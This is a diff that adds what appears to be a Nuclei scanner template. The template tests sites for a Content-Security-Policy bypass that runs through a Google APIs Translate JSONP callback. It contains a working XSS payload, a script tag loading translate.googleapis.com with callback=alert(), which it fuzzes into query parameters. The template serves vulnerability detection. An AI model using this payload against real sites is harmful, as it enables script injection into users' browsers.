@@ -1,0 +1,55 @@
+id: googleapis-translate-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Google APIs Translate
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,googleapis-translate
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "googleapis.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: googleapis_translate_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "googleapis_translate_csp_xss == true"
+# digest: 4a0a00473045022100a31e5685a5511f93fa037af05e640ccf253c4d92de526043ad7fd7b9b853f3bd02207ceb16daed1c67b59c153f1b1c195107ccf64a83b099ce1896d8c70845fbdf45:922c64590222798bb761d5b6d8e72950
